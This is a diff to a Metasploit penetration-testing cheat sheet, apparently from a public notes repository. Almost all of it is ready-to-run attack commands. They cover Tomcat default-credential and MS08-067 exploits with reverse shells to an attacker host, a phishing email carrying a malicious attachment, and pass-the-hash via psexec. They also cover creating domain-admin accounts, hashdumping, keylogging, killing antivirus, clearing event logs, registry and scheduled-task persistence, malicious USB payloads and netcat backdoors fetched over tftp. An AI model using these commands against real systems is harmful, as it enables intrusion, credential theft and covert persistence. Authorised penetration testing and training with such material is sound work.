@@ -1,6 +1,28 @@
 Metasploit
 
 
+# Apache Tomcat Manager Common Administrative Credentials
+
+use multi/tomcat_mgr_deploy
+show options
+set password admin
+set username admin
+set RHOST <target IP>
+set RPORT <target port>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attack IP>
+exploit
+------------------------------------------------------------------------------------------------------
+
+# MS08-067
+
+use windows/smb/ms08_067_netapi
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attack IP>
+exploit
+------------------------------------------------------------------------------------------------------
+
 # Persistance
 
 Example 1
@@ -34,13 +56,64 @@ Note the port that is used.
 msf > use multi/handler
 msf > set payload windows/metsvc_bind_tcp
 msf > set LPORT <port>
-msf > set RHOST <targetIP>
+msf > set RHOST <target IP>
 msf > exploit
-==========================
+------------------------------------------------------------------------------------------------------
 
-Below here are OLD notes that have NOT been organized.
+# Phishing
 
-meterpreter > impersonate_token DOMAIN\\Administrator
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set EnableStageEncoding true
+set ExitOnSession false
+set LPORT 22
+exploit -j
+ 
+sendEmail -t ceo@target.com -f leebaird@gmail.com -s <targetIP> -u Salaries -a /root/Desktop/salaries.pdf
+------------------------------------------------------------------------------------------------------
+
+# Pivoting
+ 
+meterpreter > ipconfig
+192.168.0.10
+255.255.255.0
+ 
+10.10.10.5
+255.255.255.0
+ 
+meterpreter > run arp_scanner -r 10.10.10.1/24
+10.10.10.1
+10.10.10.2
+10.10.10.5
+ 
+meterpreter > background
+msf > route add 10.10.10.1 255.255.255.0 x	                   # Where x is the meterpreter session number.
+msf > use auxiliary/scanner/portscan/tcp
+msf > set RHOSTS 10.10.10.2
+msf > set PORTS 1-200
+msf > set THREADS 255
+msf > exploit
+msf > use exploit/windows/smb/ms08_067_netapi
+msf > set RHOST 10.10.10.2
+msf > set PAYLOAD windows/meterpreter/bind_tcp
+msf > exploit
+------------------------------------------------------------------------------------------------------
+
+# psexec
+
+use windows/smb/psexec
+set RHOST <target IP>
+set SMBPass <Administrator hash from another target>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attack IP>
+exploit
+------------------------------------------------------------------------------------------------------
+
+===  Below here are OLD notes that have NOT been organized.  ===
+
+
+meterpreter > impersonate_token DOMAIN\Administrator
 [+] Delegation token available
 [+] Successfully impersonated user DOMAIN\Administrator 
 
@@ -53,40 +126,15 @@ C:\WINDOWS\system32> whoami
 whoami
 DOMAIN\administrator
 
-C:\WINDOWS\system32> net user hacker hacker_password /add /domain
+C:\WINDOWS\system32> net user hacker password /add /domain
 The command completed successfully.
 
 C:\WINDOWS\system32> net group "Domain Admins" hacker /add /domain
 The command completed successfully.
-
-Example Exploits
-Apache Tomcat Manager Common Administrative Credentials
-use multi/tomcat_mgr_deploy
-show options
-set password admin
-set username admin
-set RHOST <target IP>
-set RPORT <target port>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attack IP>
-exploit
-
-MS08-067
-use windows/smb/ms08_067_netapi
-set RHOST <target IP>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attack IP>
-exploit
-
-psexec
-use windows/smb/psexec
-set RHOST <target IP>
-set SMBPass <Administrator hash from another target>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attack IP>
-exploit
+==========
 
 Post Exploitation using meterpreter
+
 run migrate                                       Create a new process and migrate to it.
 ps                                                Show running processes.
 sysinfo                                           Show host name and OS.
@@ -106,9 +154,9 @@ route
 use incognito
 list_tokens -g
 list_tokens -u
-add_user accuvant password -h <target IP>
-add_group_user "Enterprise Admins" accuvant -h <target IP>
-add_group_user "Remote Access Users" accuvant -h <target IP>
+add_user hacker password -h <target IP>
+add_group_user "Enterprise Admins" hacker -h <target IP>
+add_group_user "Remote Access Users" hacker -h <target IP>
 
 (Open a new tab in Konsole)
      cp /pentest/windows-binaries/passwd-attack/fgdump.exe /tmp/
@@ -137,8 +185,8 @@ shell                                             Drop into a
 (from a Windows shell)
 net user                                          Show user accounts.
 net accounts                                      Show password policies.
-net user accuvant accuvant /add                   Add a new account called ciphent with the password ciphent.
-net localgroup Administrators accuvant /add       Add the new account to the Administrators security group.
+net user hacker password /add                     Add a new account called ciphent with the password ciphent.
+net localgroup Administrators hacker /add         Add the new account to the Administrators security group.
 net localgroup administrators
 ipconfig
 [take screen shot]
@@ -146,10 +194,9 @@ exit
 
 meterpreter > clearev
 meterpreter > exit
+==========
 
-=====
-
-Malicious USB drive
+# Malicious USB drive
 
 msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
 msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=attackerIP LPORT=443 > evil.exe
@@ -157,12 +204,11 @@ msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfenc
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 0.0.0.0
+set LHOST <attacker IP>
 set LPORT 443
 set ExitOnSession false
 exploit -j
-
-=====
+==========
 
 getpid
 ps
@@ -182,6 +228,7 @@ clearev
 
 upload <local path> <remote path>
 upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
+==========
 
 hashdump
 <copy hashes>
@@ -189,6 +236,7 @@ nano tmp
 <paste hashes>
 cat tmp | cut -d ":" -f4 > ntlm-hashes
 cat ntlm-hashes
+==========
 
 run checkvm
 run getcountermeasure
@@ -204,6 +252,7 @@ telnet <target IP>
 root
 toor
 dir
+==========
 
 run persistence -r <attacker IP> -p 443 -A -x -i 100
 background
@@ -218,6 +267,7 @@ cd .msf3/logs/winenum
 ls
 cd <target name>
 ls
+==========
 
 use sniffer
 help
@@ -230,110 +280,70 @@ sniffer_stop 1
 (open the cap file with Wireshark)
 
 run scheduleme -m 1 -u -e /root/test.exe
-
-=====
+==========
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST rmccurdy.com
+set LHOST <attacker IP>
 set LPORT 21
 set ExitOnSession false
-# set AutoRunScript pathto script you want to autorun after exploit is run 
+# set AutoRunScript path to script you want to autorun after exploit is run 
 set AutoRunScript persistence -r <targetIP> -p 21 -A -X -i 30 
-
 exploit -j -z
-
-# file_autopwn
-rm -Rf /tmp/1 
-mkdir /tmp/1 
-rm -Rf ~/.msf3
-
-wget www.target.com/test.pdf
-
-msfconsole
-
-db_driver sqlite3
-db_create pentest11
-setg LHOST 75.139.158.51
-setg LPORT 21
-setg SRVPORT 21
-setg LPORT_WIN32 21
-
-setg INFILENAME test.pdf
-
-use auxiliary/server/file_autopwn
-
-set OUTPATH /tmp/1
-
-set URIPATH /msf
-set SSL true
-set ExitOnSession false
-set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript persistence -r <targetIP> -p 21 -A -X -i 30
-run
+==========
 
 # shows all the scripts
 run [tab]
+==========
 
 # persistence! broken ...if you use DNS name ..
 run persistence -r <targetIP> -p 21 -A -X -i 30
+==========
 
-run get_pidgin_creds
+# Session hijack tokens
 
-idletime 
-sysinfo
-
-# SYSTEM SHELL ( pick a proc that is run by system )
-migrate 376
-shell
-
-# session hijack tokens
 use incognito
 impersonate_token "NT AUTHORITY\\SYSTEM"
 
-# escalate to system
+# Escalate to SYSTEM
 use priv
 getsystem
 
 execute -f cmd.exe -H -c -i -t
 execute -f cmd.exe -i -t
+==========
 
-# list top used apps
+# List top used apps
 run prefetchtool -x 20
 
-# list installed apps
+# List installed apps
 run prefetchtool -p
+==========
 
-run get_local_subnets
+# Find and download files
 
-# find and download files
 run search_dwld "%USERPROFILE%\\my documents" passwd
 run search_dwld "%USERPROFILE%\\desktop passwd
 run search_dwld "%USERPROFILE%\\my documents" office 
 run search_dwld "%USERPROFILE%\\desktop" office
 
-# alternate 
+# Alternate 
 download -r "%USERPROFILE%\\desktop"  ~/
 download -r "%USERPROFILE%\\my documents"  ~/
 
-# alternate to shell not SYSTEM
+# Alternate to shell not SYSTEM
 # execute -f cmd.exe -H -c -i -t
-
-# does some run wmic commands etc
-run winenum
+==========
 
 # rev shell the hard way
 run scheduleme -m 1 -u /tmp/nc.exe -o "-e cmd.exe -L -p 8080"
+==========
 
-# An example of a run of the file to download via tftp of Netcat and then running it as a backdoor.
+# An example of a run of the file to download via tftp of netcat and then running it as a backdoor.
+
 run schtasksabuse-dev -t 192.168.1.7 -c "tftp -i 192.168.1.8 GET nc.exe,nc -L -p 8080 -e cmd.exe" -d 4
 run schtasksabuse -t 192.168.1.7 -c "tftp -i 192.168.1.8 GET nc.exe,nc -L -p 8080 -e cmd.exe" -d 4
-
-# vnc / port fwd for linux
-run vnc
-
-# priv esc 
-run kitrap0d
+==========
 
 run getgui
 run killav
@@ -349,62 +359,16 @@ reg enumkey -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\f
 reg setval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v sys
 reg queryval -k HKLM\\system\\controlset001\services\\sharedaccess\\parameters\\firewallpolicy\\Standardprofile\\authorizedapplications\\list -v system32 
 upload /neo/wallpaper1.bmp "C:\\documents and settings\\pentest3\\local settings\\application data\\microsoft\\" 
-
-getuid
-ps
-getpid
-keyscan_start
-keyscan_dump
-migrate 520
-portfwd add -L 104.4.4 -l 6666 -r 192.168.1.1 -p 80"
-portfwd add -L 192.168.1.1 -l -r 10.5.5.5 -p 6666
-
-shell
-run myremotefileserver_mserver -h
-run myremotefileserver_mserver -p 8787
-
-run msf_bind
-run msf_bind -p 1975
-rev2self
-getuid
-
-getuid
-
-enumdesktops
-grabdesktop
-
-run deploymsf -f framework-3.3-dev.exe
-
-run hashdump
-run metsvc
-run scraper
-run checkvm
-run keylogrecorder
-run netenum -fl -hl localhostlist.txt -d google.com
-run netenum -rl -r 10.192.0.50-10.192.0.254
-run netenum -st -d google.com
-run netenum -ps -r 10.192.0.50-254
-
-# Windows Login Brute Force Meterpreter script
-run winbf -h
-
-# Upload a script or executable and run it
-uploadexec
+==========
 
 # Using payload as a backdoor from a shell 
 
-REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\Curre ntVersion\Run /v firewall /t REG_SZ /d "c:\windows\system32\metabkdr.exe" /f
-at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\metabkdr.exe"
-SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\metabkdr.exe"  /ED 11/11/2011
+REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\Curre ntVersion\Run /v firewall /t REG_SZ /d "c:\windows\system32\evil.exe" /f
+at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\evil.exe"
+SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\evil.exe"  /ED 11/11/2011
+==========
 
-# kill AV this will not unload it from mem it needs reboot or kill from memory still ... Darkspy, Seem, Icesword GUI can kill the tasks
-catchme.exe  -K "c:\Program Files\Kaspersky\avp.exe"
-catchme.exe  -E "c:\Program Files\Kaspersky\avp.exe"
-catchme.exe  -O "c:\Program Files\Kaspersky\avp.exe" dummy
-
-=====
-
-MSF Post Exploitation
+# Post exploitation
 
 sysinfo
 getuid
@@ -419,7 +383,7 @@ run get_application_list
 run scraper
 =====
 
-root@bt: cd /root/.msf4/logs/scripts/scrapper/<targetIP>/
+root@bt: cd /root/.msf4/logs/scripts/scrapper/<target IP>/
 root@bt: ls
 root@bt: cat hashes.txt
 =====
@@ -428,7 +392,7 @@ getsystem -t 0
 getuid
 rev2self
 getuid
-ps		Look for process ID that NT/Authority is running (example: Explorer)
+ps		                   Look for process ID that NT/Authority is running (example: Explorer)
 migrate <PID of Explorer>
 getpid
 clearev
@@ -440,3 +404,25 @@ keyscan_stop
 getsystem
      if this fails
 run post/windows/escalate/bypassuac
+==========
+
+msf > use auxiliary/gather/dns_bruteforce
+msf > use auxiliary/gather/dns_info
+msf > use auxiliary/gather/dns_reverse_lookup
+==========
+ 
+set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/run_console_rc_file RESOURCE=/opt/scripts/resource/post.rc
+
+==========
+ 
+run post/windows/gather/credentials/vnc
+run post/windows/gather/cachedump
+use incognito
+list_tokens -u
+ 
+add_user hacker password -h <target-IP>
+add_localgroup_user Administrators hacker -h <target-IP>
+ 
+add_group_user "Domain Admins" hacker -h <target-IP>
+add_group_user "Enterprise Admins" hacker -h <target-IP>
+ 
